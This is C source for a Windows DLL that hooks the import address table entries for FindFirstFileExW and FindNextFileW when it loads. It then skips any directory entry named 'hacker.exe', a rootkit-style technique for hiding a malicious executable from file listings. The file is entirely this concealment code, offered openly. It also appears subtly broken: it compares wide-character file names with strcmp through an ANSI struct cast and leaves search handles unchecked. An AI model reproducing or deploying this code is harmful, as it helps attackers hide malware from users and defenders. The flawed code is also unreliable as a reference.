#include <windows.h>
#define FILENAME "hacker.exe"

LONG IATHook(
	__in_opt void* pImageBase,
	__in_opt const char* pszImportDllName,
	__in const char* pszRoutineName,
	__in void* pFakeRoutine,
	__out HANDLE* phHook
);

LONG UnIATHook(__in HANDLE hHook);

void* GetIATHookOrign(__in HANDLE hHook);

typedef HANDLE(__stdcall *LPFN_FindFirstFileExW)(
	LPCWSTR lpFileName,
	FINDEX_INFO_LEVELS finfoLevelId,
	LPVOID lpFindFileData,  //contain the imformation of first file
	FINDEX_SEARCH_OPS  fSearchOp,
	LPVOID             lpSearchFilter,
	DWORD              dwAdditionalFlags
	);

typedef BOOL(_stdcall*LPFN_FindNextFileW)(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData //contain imformation of file
	);

HANDLE g_hHook_FindFirstFileExW = NULL;
HANDLE g_hHook_FindNextFileW = NULL;

HANDLE _stdcall Fake_FindFirstFileExW(
	LPCWSTR lpFileName,
	FINDEX_INFO_LEVELS finfoLevelId,
	LPVOID lpFindFileData,
	FINDEX_SEARCH_OPS  fSearchOp,
	LPVOID             lpSearchFilter,
	DWORD              dwAdditionalFlags
) {
	LPFN_FindFirstFileExW fnOrigin_First = (LPFN_FindFirstFileExW)GetIATHookOrign(g_hHook_FindFirstFileExW);
	HANDLE hFindFile = fnOrigin_First(lpFileName, finfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
	// the target file,skip it
	if (strcmp(((WIN32_FIND_DATA*)lpFindFileData)->cFileName, FILENAME) == 0) {
		FindNextFileW(hFindFile, (LPWIN32_FIND_DATAW)lpFindFileData);
	}
	return hFindFile; //return the file handle which will be used in FindNextFileW
}

BOOL _stdcall Fake_FindNextFileW(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
) {
	BOOL ret;
	LPFN_FindNextFileW fnOrigin_Next = (LPFN_FindNextFileW)GetIATHookOrign(g_hHook_FindNextFileW);
	ret = fnOrigin_Next(hFindFile, lpFindFileData);
	// the target file,skip it
	if (strcmp(((WIN32_FIND_DATA*)lpFindFileData)->cFileName, FILENAME) == 0)
	{
		ret = FindNextFileW(hFindFile, (LPWIN32_FIND_DATAW)lpFindFileData);
	}
	return ret;
}

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered)
{

	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		IATHook(
			GetModuleHandleW(NULL),
			"kernel32.dll",
			"FindFirstFileExW",
			Fake_FindFirstFileExW,
			&g_hHook_FindFirstFileExW
		);

		IATHook(
			GetModuleHandleW(NULL),
			"kernel32.dll",
			"FindNextFileW",
			Fake_FindNextFileW,
			&g_hHook_FindNextFileW
		);
		break;
	case DLL_PROCESS_DETACH:
		UnIATHook(g_hHook_FindFirstFileExW);
		UnIATHook(g_hHook_FindNextFileW);
		break;
	}
	return TRUE;

}